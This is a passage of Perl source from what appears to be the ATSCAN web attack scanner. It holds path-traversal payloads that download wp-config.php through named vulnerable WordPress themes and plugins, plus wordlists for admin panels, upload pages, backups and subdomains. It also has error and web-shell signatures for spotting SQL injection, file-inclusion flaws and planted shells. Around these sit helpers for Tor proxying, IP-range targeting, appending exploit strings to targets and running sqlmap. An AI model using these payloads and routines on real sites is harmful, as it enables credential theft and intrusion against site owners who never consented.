"/wp-content/themes/trinity/lib/scripts/download.php?file=../../../../../wp-config.php",
"/wp-content/themes/epic/includes/download.php?file=wp-config.php",
"/wp-content/themes/urbancity/lib/scripts/download.php?file=../../../../../wp-config.php",
"/wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php",
"/wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php",
"/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php",
"/wp-content/themes/lote27/download.php?download=../../../wp-config.php",
"/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php",
"/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php",
"/wp-content/plugins/justified-image-grid/download.php?file=file:///C:/wamp/www/wp-config.php",
"/wp-content/plugins/justified-image-grid/download.php?file=file:///C:/xampp/htdocs/wp-config.php",
"/wp-content/plugins/justified-image-grid/download.php?file=file:///var/www/wp-config.php",
"/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php",
"/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php");
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub ADMIN {@ADMIN=("/admin/", "/myadmin/", "/acceso/", "/administrator/", "/admin1/", "/admin2/", "/admin3/", "/admin4/", "/admin5/", "/usuarios/", "/usuario/", "/administrador/", "/administrateur/", "/moderator/", "/webadmin/", "/adminarea/", "/bb-admin/", "/adminLogin/", "/admin_area/", "/panel-administracion/", "/instadmin/", "/memberadmin/", "/administratorlogin/", "/adm/", "/wp-login.php", "/admin/account.php", "/admin/index.php", "/admin/login.php", "/admin/admin.php", "/admin/account.php", "/admin_area/admin.php", "/admin_area/login.php", "/siteadmin/login.php", "/siteadmin/index.php", "/siteadmin/login.html", "/admin/account.html", "/admin/index.html", "/admin/login.html", "/admin/admin.html", "/admin_area/index.php", "/bb-admin/index.php", "/bb-admin/login.php", "/bb-admin/admin.php", "/admin/home.php", "/admin_area/login.html", "/admin_area/index.html", "/admin/controlpanel.php", "/admin.php", "/admincp/index.asp", "/admincp/login.asp", "/admincp/index.html", "/admin/account.html", "/administracion", "/adminpanel.html", "/webadmin.html", "/webadmin/index.html", "/webadmin/admin.html", "/webadmin/login.html", "/admin/admin_login.html", "/admin_login.html", "/panel-administracion/login.html", "/admin/cp.php", "/cp.php", "/administrator/index.php", "/administrator/login.php", "/nsw/admin/login.php", "/webadmin/login.php", "/admin/admin_login.php", "/admin_login.php", "/administrator/account.php", "/administrator.php", "/admin_area/admin.html", "/pages/admin/admin-login.php", "/admin/admin-login.php", "/admin-login.php", "/bb-admin/index.html", "/bb-admin/login.html", "/acceso.php", "/bb-admin/admin.html", "/admin/home.html", "/login.php", "/modelsearch/login.php", "/moderator.php", "/moderator/login.php", "/moderator/admin.php", "/account.php", "/pages/admin/admin-login.html", "/admin/admin-login.html", "/admin-login.html", "/controlpanel.php", "/admincontrol.php", "/admin/adminLogin.html", "/adminLogin.html", "/admin/adminLogin.html", "/home.html", "/rcjakar/admin/login.php", "/adminarea/index.html", "/adminarea/admin.html", "/webadmin.php", "/webadmin/index.php", "/webadmin/admin.php", "/admin/controlpanel.html", "/admin.html", "/admin/cp.html", "cp.html", "/adminpanel.php", "/moderator.html", "/administrator/index.html", "/administrator/login.html", "/user.html", "/administrator/account.html", "/administrator.html", "/login.html", "/modelsearch/login.html", "/moderator/login.html", "/adminarea/login.html", "/panel-administracion/index.html", "/panel-administracion/admin.html", "/modelsearch/index.html", "/modelsearch/admin.html", "/admincontrol/login.html", "/adm/index.html", "adm.html", "/moderator/admin.html", "/user.php", "account.html", "/controlpanel.html", "/admincontrol.html", "/panel-administracion/login.php", "/wp-login.php", "/adminLogin.php", "/admin/adminLogin.php", "/home.php", "/admin.php", "/adminarea/index.php", "/adminarea/admin.php", "/adminarea/login.php", "/panel-administracion/index.php", "/panel-administracion/admin.php", "/modelsearch/index.php", "/modelsearch/admin.php", "/admincontrol/login.php", "/adm/admloginuser.php", "/admloginuser.php", "/admin2.php", "/admin2/login.php", "/admin2/index.php", "/usuarios/login.php", "/adm/index.php", "/adm.php", "/affiliate.php", "/adm_auth.php", "/memberadmin.php", "/administratorlogin.php");
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub SUBDOMAIN {@SUBDOMAIN =("about.", "abose.", "acme.", "ad.", "admanager.", "admin.", "admins.", "administrador.", "administrateur.", "administrator.", "ads.", "adsense.", "adult.", "adwords.", "affiliate.", "affiliatepage.", "afp.", "analytics.", "android.", "shop.", "echop.", "blog.", "tienda.", "answer.", "ap.", "api.", "apis.", "app.", "bank.", "blogs.", "client.", "clients.", "community.", "content.", "cpanel.", "dashbord.", "data.", "developer.", "developers.", "dl.", "docs.", "documents.", "download.", "downloads.", "encrypted.", "email.", "webmail.", "mail.", "correo.", "ftp.", "forum.", "forums.", "feed.", "feeds.", "file.", "files.", "gov.", "home.", "help.", "invoice.", "invoises.", "items.", "js.", "es.", "it.", "en.", "fr.", "ar.", "legal.", "iphone.", "lab.", "labs.", "list.", "lists.", "log.", "logs.", "errors.", "net.", "mysql.", "mysqldomain.", "net.", "network.", "news.", "ns.", "ns1.", "ns2.", "ns3.", "ns4.", "ns5.", "org.", "panel.", "partner.", "partners.", "pop.", "pop3.", "private.", "proxies.", "public.", "reports.", "root.", "rss.", "prod.", "prods.", "sandbox.", "search.", "server.", "servers.", "signin.", "signup.", "login.", "smtp.", "srntp.", "ssl.", "soap.", "stat.", "statics.", "store.", "status.", "survey.", "sync.", "system.", "text.", "test.", "webadmin.", "webdisk.", "xhtml.", "xhtrnl.", "xml.");
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub UPLOAD {@UPLOAD = ("/up.php", "/up1.php", "up/up.php", "/site/up.php", "/vb/up.php", "/forum/up.php", "/blog/up.php", "/upload.php", "/upload1.php", "/upload2.php", "/vb/upload.php", "/forum/upload.php", "blog/upload.php", "site/upload.php", "download.php");
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub ZIP {@ZIP = ("/backup.tar.gz", "/backup/backup.tar.gz", "/backup/backup.zip", "/vb/backup.zip", "/site/backup.zip", "/backup.zip", "/backup.rar", "/backup.sql", "/vb/vb.zip", "/vb.zip", "/vb.sql", "/vb.rar", "/vb1.zip", "/vb2.zip", "/vbb.zip", "/vb3.zip", "/upload.zip", "/up/upload.zip", "/joomla.zip", "/joomla.rar", "/joomla.sql", "/wordpress.zip", "/wp/wordpress.zip", "/blog/wordpress.zip", "/wordpress.rar");
}
############################################################################################################################################################################################
############################################################################################################################################################################################
my @browserlangs=('fr', 'it', 'ie', 'us', 'br', 'ma', 'dz', 'se', 'nl', 'il', 'ca', 'pt', 'pl', 'eg', 'tn', 'ae', 'qa', 'af', 'iq', 'ch', 'mx', 've', 'es', 'ro', 'ru', 'jp', 'id', 'de', 'ua', 'sa', 'ok', 'fi', 'no', 'cz', 'lu', 'uy');
############################################################################################################################################################################################
############################################################################################################################################################################################
my @ERROR = ("root:x", "You have an error in your SQL syntax", "Warning: mysql", "ORA-", "Oracle ODBC", "Oracle Error", "Oracle Driver", "Oracle DB2", "error ORA-", "SQL command not properly ended", "DB2 ODBC", "DB2 error", "DB2 Driver", "ODBC SQL", "ODBC DB2", "ODBC Driver", "ODBC Error", "ODBC Microsoft Access", "ODBC Oracle", "ODBC Microsoft Access Driver", "Warning: pg_", "PostgreSql Error:", "Supplied argument is not a valid PostgreSQL result", "function.mysql", "MySQL result index", "MySQL Error", "MySQL ODBC", "PostgreSQL query failed: ERROR: parser: parse error", "Warning: sybase_", "function.sybase", "Sybase result index", "Sybase Error:", "Sybase: Server message:", "ODBC Driver:",  "Database Query", "SQLServer JDBC Driver", "JDBC SQL", "JDBC Oracle", "JDBC MySQL", "JDBC error", "JDBC Driver", "java.io.IOException: InfinityDB", "Warning: include", "Warning: require", "Fatal error: require", "ADODB_Exception", "Warning: include", "Warning: require_once", "function.include", "EDisallowed Parent Path", "function.require","MySQL Driver", "mysqli.query", "num_rows", "mysql error:", "supplied argument is not a valid MySQL result resource", "Error Executing Database Query", "mysql_fetch_assoc", "Warning: main", "Warning: session_start", "Warning: getimagesize", "Warning: array_merge", "Warning: preg_match", "GetArray", "EFetchRow", "Warning: preg_", "Warning: ociexecute", "Warning: ocifetchstatement", "PHP Warning:", "Version Information: Microsoft .NET Framework", "Server.Execute Error", "ASP.NET_SessionId", "ASP.NET is configured to show verbose error messages", "BOF or EOF", "Unclosed quotation mark", "Error converting data type varchar to numeric", "LuaPlayer ERROR:", "CGILua message", "ELua error", "Incorrect syntax near", "Fatal error", "Invalid Querystring", "An illegal character has been found in the statement", "<title>Shell</title>", "<title>(.*)Shell</title>", "<title>(.*)Shell(.*)</title>", "<title>(.*)r57shell(.*)</title>", "Hacked by", "backdoor by", "<title>(.*)C99Shell(.*)</title>");
############################################################################################################################################################################################
############################################################################################################################################################################################
@JOOMCMS = ("/administrator/index.php");
############################################################################################################################################################################################
############################################################################################################################################################################################
@WPCMS = ("/wp-login.php");
############################################################################################################################################################################################
############################################################################################################################################################################################
my @MODULETYPE = ("<a href=\"https:\/\/wordpress.org\/\">Proudly powered by WordPress", "<meta name=\"generator\" content=\"Joomla", "Powered by <a href=\"http:\/\/www.textpattern.com\" title=\"Textpattern", "<a href=\"http:\/\/www.simplemachines.org/about/copyright.php\" title=\"Free Forum Software\" target=\"_blank\">SMF", "Powered by <a href=\"http:\/\/www.phpbb.com/\">phpBB", "<a href=\"https:\/\/www.vbulletin.com\" id=\"vbulletinlink\">vBulletin", "vBulletin Solutions\, Inc\. All rights reserved", "Powered By <a href=\"http:\/\/www.mybboard.net\" target=\"_blank\">MyBB", "<a href=\"http:\/\/www.cloudflare.com\/\" target=\"_blank\" style", "DDoS protection by CloudFlare", "name=\"Generator\" content=\"Drupal", "<meta name=\"generator\" content=\"PostNuke", "<a href=\"/about.php\">About ATutor", "<META NAME=\"GENERATOR\" CONTENT=\"PHP-Nuke", "Powered by <a href=\"http:\/\/moodle.org\" title=\"Moodle\">Moodle", "<meta name=\"key words\" content=\"moodle", "Powered by <a href=\"http:\/\/www.adaptcms.com\">AdaptCMS", "<meta name=\"generator\" content=\"SilverStripe - http:\/\/silverstripe.org\" \/>", "<a href=\"http:\/\/www.modx.com\" target=\"_blank\"> Powered by MODx", "<meta name=\"generator\" content=\"XOOPS", "Powered by osCommerce", "<a href=\"http:\/\/www.oscommerce.com\" target=\"_blank\">osCommerce", "<a class=\"_blank_blank\" href=\"http:\/\/www.prestashop.com\" target=\"_blank", "Software para Ecommerce de PrestaShop", "<meta name=\"generator\" content=\"b2evolution", "MAGENTO\, INC\. ALL RIGHTS RESERVED", "Magento Ecommerce by Smart Solutions", "all rights reserved Zen Cart", "<a href=\"http:\/\/www.zen-cart.com\" target=\"_blank\">Zen Cart", "Powered by concrete5", "<meta name=\"generator\" content=\"concrete", "Powered By OpenCart");
############################################################################################################################################################################################
############################################################################################################################################################################################
if (!defined $nobanner) {
  print color 'bold cyan';
  print "\n";
  print "        ###    ########  ######   ######     ###    ##    ##     ";
  print color 'red';
  print "(^).-.(^)\n";
  print color RESET;
  print color 'bold cyan';
  print "       ## ##      ##    ##    ## ##    ##   ## ##   ###   ##      ";
  print color 'red';
  print "(.O_O.)\n";
  print color RESET;
  print color 'bold cyan';
  print "      ##   ##     ##    ##       ##        ##   ##  ####  ##    ";
  print color 'red';
  print "__(( A ))__\n";
  print color RESET;
  print color 'bold cyan';
  print "     ##     ##    ##     ######  ##       ##     ## ## ## ##   ";
  print color 'red';
  print "(_.-('-')-._)\n";
  print color RESET;
  print color 'bold cyan';
  print "     #########    ##          ## ##       ######### ##  ####      ";
  print color 'red';
  print "|| T ||\n";
  print color RESET;
  print color 'bold cyan';
  print "     ##     ##    ##    ##    ## ##    ## ##     ## ##   ###    ";
  print color 'red';
  print "_.' `-' '._\n";
  print color RESET;
  print color 'bold cyan';
  print "     ##     ##    ##     ######   ######  ##     ## ##    ##    ";
  print color 'red';
  print "`-'--^--`-'\n";
  print "___________________( No monopoly for knowledge )_______________(O^^^)___(^^^O)\n";
  print color RESET;
  print "\n";
}
############################################################################################################################################################################################
############################################################################################################################################################################################
desclaimer();
############################################################################################################################################################################################
############################################################################################################################################################################################
### set tor proxy
if (defined $proxy) {
  $ua->proxy([qw/ http https /] => $proxy);
  $ua->cookie_jar({});
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub existantversion {
  $existantversion='version 6.1 Stable';
  return $existantversion;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub checkversion {
  testconection();
  existantversion();
  my $URL = 'https://github.com/AlisamTechnology/ATSCAN/blob/master/version.log';
  $request = HTTP::Request->new('GET', $URL);
  my $response = $ua->request($request);
  my $html = $response->content;
  (my $gitversion) = ($html =~ /version(.*)Stable/);
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  $gitversion = "version".$gitversion."Stable";
  if ($gitversion eq $existantversion) {
	print color 'green';
	print "[!] OK! Last $gitversion No need to update!\n";
	print color RESET;
  }else{	
	print color 'red';
	print "[!] $existantversion Update Needed to ";
	print color RESET;
	print color 'green';
	print "$gitversion!\n";
	print color RESET;
	
    print color 'yellow';
    print "[!] Do you want to update tool? [Y/n]: ";
    print color RESET;
    $resp=<STDIN>;
    chomp ($resp);
	my $yes ='Y|y|yes|YES|Yes';
	if ($resp =~ /$yes/) {
      my $URL = "https://raw.githubusercontent.com/AlisamTechnology/ATSCAN/master/atscan.pl";
      $request = HTTP::Request->new('GET', $URL);
      my $response = $ua->request($request);
      my $html = $response->content;
	  if ($response->is_success) {
		unlink 'atscan.pl';
		open (FILE, '>>atscan.pl');
        print FILE $response->content;
        close (FILE);
	  }
	  print color 'green';
	  print "[!] Tool updeted with success!\n";
	  print color RESET;
	  system("chmod +x atscan.pl | perl ./atscan.pl");
	  exit();
    }else{
	  print color 'red';
	  print "[!] Can not connect to the server!\n";
	  print color RESET;
	}
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub timer {
  my ($sec,$min,$hr) = localtime();
  print "[!] [";
  print "$hr:$min:$sec";
  print "] ";
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub osinfo {
  use Config;
  print color 'bold yellow';
  print "[+] GROUP:: ";
  print color RESET;
  print color 'cyan';
  print "ALISAM TECHNOLOGY SCANNER\n";
  print color RESET;
  print color 'bold yellow';
  print "[+] TOOL:: ";
  print color RESET;
  print color 'cyan';
  existantversion();
  print "ATSCAN $existantversion\n";
  print color RESET;
  print color 'bold yellow';
  print "[+] PATH:: ";
  print color RESET;
  print color 'cyan';
  print "$Bin/",basename($0)," \n";
  print color RESET;
  print color 'bold yellow';
  print "[+] PERL VERSION:: ";
  print color RESET;
  print color 'cyan';
  print "$^V \n";
  print color RESET;
  print color 'bold yellow';
  print "[+] PLATFORM:: ";
  print color RESET;
  print color 'cyan';
  print "$Config{osname} ";
  print "$Config{archname}\n";
  print color RESET;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub advise {
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  print color 'yellow';
  print "[!] Upss.. Invalid arguments! \n";
  print "[!] Simple Usage: ./",basename($0)," \n";
  print "[!] Command line Usage: ./",basename($0)," <option> \n";
  print "[!] Help: ./",basename($0)," --help \n";
  print color RESET;
  exit;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub forwait {
  print color RESET;
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  print color 'yellow';
  print "[+] Please wait... \n";
  print color RESET;
  print color 'bold blue';
  progressbar();
  print color RESET;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub progressbar {
  use utf8;
  $| = 1;
  binmode STDOUT, ":utf8";
  timer();
  my $poop  = "::";
  for (1..32) {
    select(undef, undef, undef, 0.25);
    print "$poop";
  }
  print" \n\n";
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub scandetail {
  if (defined $Target) {
    print color 'bold yellow';
    print "[!] TARGET:: ";
    print color RESET;
    print color 'cyan';
    print "$Target ";
	if (($Target =~ m/.txt/i) || ($Target=~ m/.log/i)){
	  countinicialtargets();
    }
	print "\n";
    print color RESET;
  }
  #########################################
  #########################################
  if (defined $rangip) {
    print color 'bold yellow';
    print "[!] TARGET:: ";
    print color RESET;
    print color 'cyan';
	print "Range [$rangip]\n";
    print color RESET;
  }
  #########################################
  #########################################
  print color 'bold yellow';
  print "[+] PROXY:: ";
  print color RESET;
  if (defined $proxy) {
    print color 'green';
    print "Yes! \n";
    print color RESET;
  }else{
    print color 'cyan';
    print "No! \n";
    print color RESET;
  }
  #########################################
  #########################################
  if ((defined $misup) || (defined $validation_text)) {
    print color 'bold yellow';
    print "[+] VALIDATION:: ";
    print color RESET;
    print color 'cyan';
    if (defined $validation_text) { 
      print "$validation_text ";
    }
    if (defined $misup) { 
      print "/HTTP/1.1 200 ";
    }
    if (defined $mnoshow) { 
      print "/Hidden Process ";
    }
    print color RESET;
    print "\n";
  }
  #########################################
  #########################################
  if ((defined $mmd5) || (defined $mdecode64) || (defined $mencode64) || (defined $mtarget) || (defined $mfulltarget) || (defined $exploit) || (defined $replace)) {
    print color 'bold yellow';
    print "[+] EXPLOITATION:: ";
    print color RESET;
    print color 'cyan';
	if (defined $mmd5) {
      print "MD5 ";
	}
	if (defined $mencode64) {
      print "/Encode Base64 ";
	}
	if (defined $mdecode64) {
      print "/Decode Base64 ";
	}
    if (defined $mtarget) {
      print "/Remove parameters ";
    }
	if ((defined $replace) && (defined $with)){
      print "/Replace  ";
	}
    if (defined $exploit){
      print "/Exploit ";
    }
    if (defined $mfulltarget){
      print "/All parameters ";
    }
    print color RESET;
    print "\n";
  }
  #########################################
  #########################################
  if ((defined $mxss) || (defined $mlfi) || (defined $madmin) || (defined $mjoomrfi) || (defined $mwpadf) || (defined $mports) || (defined $mupload) || (defined $mzip) || (defined $mmails)){
    print color 'bold yellow';
    print "[+] SCAN:: ";
    print color RESET;
    print color 'cyan';
	if (defined $mxss) {
      print "/Xss ";
    }
    if (defined $mlfi) {
      print "/Lfi ";
    }
    if (defined $madmin) {
      print "/Admin ";
    }
    if (defined $mjoomrfi) {
      print "/Rfi ";
    }
    if (defined $mwpadf) {
      print "/Adf ";
    }
    if (defined $mports) {
      print "/Ports ";
    }
    if (defined $mupload) {
      print "/Upload ";
    }
    if (defined $mzip) {
      print "/Zip ";
    }
    if (defined $mmails) {
      print "/E-mails ";
    }
    print color RESET;
	print "\n";
  } 
  #########################################
  #########################################
  if ((defined $msites) || (defined $mwpsites) || (defined $mjoomsites) || (defined $msubdomain)){
    print color 'bold yellow';
    print "[+] GET:: ";
    print color RESET;
    print color 'cyan';
    if (defined $msites) { 
      print "/Server sites ";
    }
    if (defined $mwpsites) { 
      print "/WP sites ";
    }
    if (defined $mjoomsites) { 
      print "/JOOM sites ";
    }
    if (defined $msubdomain) { 
      print "/Subdomains ";
    }
    print color RESET;
	print "\n";
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
if (defined $shell) {
  print color 'bold yellow';
  print "[+] SHELL:: ";
  print color RESET;
  print color 'cyan';
  print "$shell \n";
  print color RESET;
}
if (defined $mlevel) {
  print color 'bold yellow';
  print "[+] SCAN LEVEL:: ";
  print color RESET;
  print color 'cyan';
  print "$mlevel \n";
  print color RESET;
}
if ((defined $command) || (defined $sqlmap)){
  print color 'bold yellow';
  print "[+] EXTERN CMD:: ";
  print color RESET;
  print color 'cyan';
  if (defined $command){
    print "/External Command ";
  }
  if (defined $sqlmap){
    print "/Sqlmap ";
  }
  print "\n";
  print color RESET;
}
if (defined $output) {
  print color 'bold yellow';
  print "[+] OUTPUT:: ";
  print color RESET;
  print color 'cyan';
  print "$output\n";
  print color RESET;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub testconection {
  my $URL = "http://www.google.com";
  $request = HTTP::Request->new('GET', $URL);
  $response = $ua->request($request);
  if ( !$response->is_success ) {
    print color 'bold';
    print "[ ] ----------------------------------------------------------------------- [ ]\n";
    print color 'RESET';
    print color 'red';
    print "[!] Upss.. Your Internet connection seems not active!\n";
    print "[!] Check Your Connection OR Proxy Setting!\n";
    print color 'RESET';
	exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub dorklist {
  $checkdorklist = "dorks.txt";
  if (-e $checkdorklist){ unlink 'dorks.txt'};
  if (defined $dork){
  
    my $pattern = '.txt|.log';
    if ($dork =~ m/$pattern/i) {
      if ($dork =~ m/dorks.txt/i ) {
	    print color RESET;
        print color 'bold';
        print "\n[ ] ----------------------------------------------------------------------- [ ]\n";
	    print color RESET;
	    print color 'red';
	    print "[!] Rename your list [$dork] I use the same name!\n";
	    print color RESET;
	    exit();
      }
	  use File::Copy qw(copy);
	  copy $dork, 'dorks.txt';
    }else{
      my $pat = 'inurl:|intitle:|intext:|index of|allinurl';
      if ($dork =~ m/$pat/i) {
	    $dork =~ s/$pat//g;
        $dork =~ s/ /+/g;
	  }elsif ($dork =~ m/,/i) {
        $dork =~ s/,/ /g;
  	  }elsif ($dork =~ m/ /i) {
        $dork =~ s/ /+/g;
	  }
      my @dorks = split / /, $dork;  
      foreach my $dork (@dorks) {
        open (FILE, '>>dorks.txt');
        print FILE "$dork\n";
        close (FILE);
      }
	}
  }elsif (defined $rangip) {
    if (($rangip =~ /(\d+)\.(\d+)\.(\d+)\.(\d+)\-(\d+)\.(\d+)\.(\d+)\.(\d+)/) && ($1<=255 && $2<=255 && $3<=255 && $4<=255 && $5<=255 && $6<=255 && $7<=255 && $8<=255)) { 
      my $startIp = $1.".".$2.".".$3.".".$4;
      my $endIp = $5.".".$6.".".$7.".".$8;
      my (@ip,@newIp,$i,$newIp,$j,$k,$l);
      open (FILE, '>>dorks.txt');
      @ip = split(/\./,$startIp);
      for($i=$ip[0];$i<=$5;$i++) {
	    $ip[0]=0 if($i == $5);
        for($j=$ip[1];$j<=$6;$j++) {
          $ip[1]=0 if($j == $6);
          for($k=$ip[2];$k<=$7;$k++) {
            $ip[2]=0 if($k == $7);
            for($l=$ip[3];$l<=$8;$l++) {
              $ip[3]=0 if($l == $8);
              @newIp = $newIp = join('.',$i,$j,$k,$l);
              print FILE "$newIp \n";
            }
	      }
		}
      }
	  close (FILE);
	}else{
	  print "[ ] ----------------------------------------------------------------------- [ ]\n";
      print color 'red';
	  print "[!] $rangip is not a valid range! [Ex: --rang 15.24.123.142-142.11.10.101]\n";
      print color RESET;
      exit();
	}
  }elsif (defined $Target){
	if (-e 'dorks.txt'){ unlink 'dorks.txt'};
    my $pattern = '.txt|.log';
    if ($Target =~ m/$pattern/i) {
      if ($Target =~ m/dorks.txt/i ) {
	    print color RESET;
        print color 'bold';
        print "\n[ ] ----------------------------------------------------------------------- [ ]\n";
	    print color RESET;
	    print color 'red';
	    print "[!] Rename your list [$dork] I use the same name!\n";
	    print color RESET;
	    exit();
      }
	  use File::Copy qw(copy);
	  copy $Target, 'dorks.txt';
    }else{
	  if ($Target =~ m/,/i) {
        $Target =~ s/,/ /g;
  	  }elsif ($Target =~ m/ /i) {
        $Target =~ s/ /+/g;
      }
      my @targets = split / /, $Target;
      foreach my $Target (@targets) {
        open (FILE, '>dorks.txt');
        print FILE "$Target\n";
        close (FILE);
	  }
    }
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub targetlist {
  $checkdorklist = "search.txt";
  if (-e $checkdorklist){ unlink 'search.txt'};
  if (defined $rangip) {
    if (($rangip =~ /(\d+)\.(\d+)\.(\d+)\.(\d+)\-(\d+)\.(\d+)\.(\d+)\.(\d+)/) && ($1<=255 && $2<=255 && $3<=255 && $4<=255 && $5<=255 && $6<=255 && $7<=255 && $8<=255)) { 
      my $startIp = $1.".".$2.".".$3.".".$4;
      my $endIp = $5.".".$6.".".$7.".".$8;
		
      my (@ip,@newIp,$i,$newIp,$j,$k,$l);
      open (FILE, '>>search.txt');
      @ip = split(/\./,$startIp);
      for($i=$ip[0];$i<=$5;$i++) {
	    $ip[0]=0 if($i == $5);
        for($j=$ip[1];$j<=$6;$j++) {
          $ip[1]=0 if($j == $6);
          for($k=$ip[2];$k<=$7;$k++) {
            $ip[2]=0 if($k == $7);
            for($l=$ip[3];$l<=$8;$l++) {
              $ip[3]=0 if($l == $8);
              @newIp = $newIp = join('.',$i,$j,$k,$l);
              print FILE "$newIp \n";
            }
          }
	    }
      }
	  close (FILE);
	}else{
	  print "[ ] ----------------------------------------------------------------------- [ ]\n";
      print color 'red';
	  print "[!] $rangip is not a valid range! [Ex: --rang 15.24.123.142-142.11.10.101]\n";
      print color RESET;
      exit();
	}
  }elsif (defined $Target) {
    my $pattern = '.txt|.log';
    if ($Target =~ m/$pattern/i) {
      if ($Target =~ m/search.txt/i ) {
	    print color RESET;
        print color 'bold';
        print "\n[ ] ----------------------------------------------------------------------- [ ]\n";
	    print color RESET;
	    print color 'red';
	    print "[!] Rename your list [$Target] I use the same name!\n";
	    print color RESET;
	    exit();
      }
	  use File::Copy qw(copy);
	  copy $Target, 'search.txt';
    }else{
	  if ($Target =~ m/,/i) {
        $Target =~ s/,/ /g;
  	  }elsif ($Target =~ m/ /i) {
        $Target =~ s/ /+/g;
      }
	  if (-e 'search.txt'){ unlink 'search.txt'};
      my @targets = split / /, $Target;
      foreach my $Target (@targets) {
        open (FILE, '>search.txt');
        print FILE "$Target\n";
        close (FILE);
	  }
    }
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub checkurltype{
  $URL=$_[0];
  if ($URL=~m/(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/ && ($1<=255 && $2<=255 && $3<=255 && $4<=255 )){
	print "[ ] ----------------------------------------------------------------------- [ ]\n";
    print color 'red';
	print "[!] $URL is an IP [Use: -t <ip> --level 20 <opcion>]! \n";
    print color RESET;
    exit();
  }else{
    return $URL;
  }
}	
############################################################################################################################################################################################
############################################################################################################################################################################################
sub checkip{
  $URL=$_[0];
  if ($URL!~m/(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/ && ($1<=255 && $2<=255 && $3<=255 && $4<=255 )){
	print "[ ] ----------------------------------------------------------------------- [ ]\n";
    print color 'red';
	print "[!] $URL is an IP [Use: -t <ip> --level 20 <opcion>]! \n";
    print color RESET;
    exit();
  }else{
    return $URL;
  }
}	
############################################################################################################################################################################################
############################################################################################################################################################################################
sub countdorks {
  my $lc = 0;
  my $file = $dork;
  if (!-e $dork) {
	print color RESET;
    print color 'bold';
    print "\n[ ] ----------------------------------------------------------------------- [ ]\n";
	print color RESET;
	print color 'red';
	print "[!] Dont make me crazy! NO $dork found!\n";
	print color RESET;
	exit();
  }
  open $file, "<", $dork;
  $lc++ while <$file>;
  print color 'cyan';
  print "[$lc Dorks(s) Found in the List!]\n";
  print color RESET;
  close $file;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub countdorkslist {
  my $lc = 0;
  my $file = "dorks.txt";
  open $file, "<", $file;
  $lc++ while <$file>;
  print "$lc";
  close $file;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub countinicialtargets {
  my $lc = 0;
  my $file = $Target;
  if (!-e $Target) {
	print color RESET;
    print color 'bold';
    print "\n[ ] ----------------------------------------------------------------------- [ ]\n";
	print color RESET;
	print color 'red';
	print "[!] Dont make me crazy! NO $Target found!\n";
	print color RESET;
	exit();
  }
  open $file, "<", $Target;
  $lc++ while <$file>;
  print color 'cyan';
  print "[$lc Target(s) Found in the List!]";
  print color RESET;
  close $file;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub countsqllist {
  my $lc = 0;
  open $file, "<", "scan.txt";
  $lc++ while <$file>;
  print "$lc"; 
  close $file;
}

############################################################################################################################################################################################
############################################################################################################################################################################################
sub countsearchlist {
  my $lc = 0;
  open $file, "<", "search.txt";
  $lc++ while <$file>;
  print "$lc"; 
  close $file;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub control {
  $URL=$_[0];
  if (defined $mfulltarget) {
    $URL=$URL;
  }
  if (defined $mtarget) {
	if (index($URL, 'http://') != -1) {
	  $URL =~ s/http:\/\///g;
	}
	$URL =~ s/\/.*//s;
  }
  if ((defined $replace) && (defined $with)) {
	if (index($URL, 'http://') != -1) {
	  $URL =~ s/http:\/\///g;
	}
	$URL =~ s/\/.*/\/$with/g;
  }
  if (defined $exploit) {
    $URL = $URL.$exploit;
  }
  if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
  return $URL;
}	
############################################################################################################################################################################################
############################################################################################################################################################################################
sub getlist {
  if (defined $output) { my $output = $output;}
  else{ my $output = "scan.txt"; }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub checkextrainfo {
  my $checkip=$URL1;	 
  if (index($checkip, 'http://') != -1) {
	$checkip =~ s/http:\/\///g;
  }
  use Socket;
  $checkip=~ s/\/.*//s;
  #if($checkip !~ /http:\/\//) { $checkip = "http://$checkip"; };	
  $ip = Socket::inet_ntoa(inet_aton($checkip));
  print color 'bold';
  print "    IP:     ";
  print color RESET;
  print "$ip\n";

  if ((defined $replace) && (defined $with)) {
	print color 'bold';
	print "    REPLC:  ";
	print color RESET;
	print "[$replace] => [$with]\n";
  }
  if (defined $exploit) {
	print color 'bold';
	print "    EXPL:   ";
	print color RESET;
    print "$exploit\n";
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub checkedurl {
  $request = HTTP::Request->new('GET', $URL1);
  my $response = $ua->request($request);
  my $html = $response->content;
  my $status = $response->code;
  my $serverheader = $response->server;
  my $httpd = $response->headers_as_string;
  
  checkextrainfo();
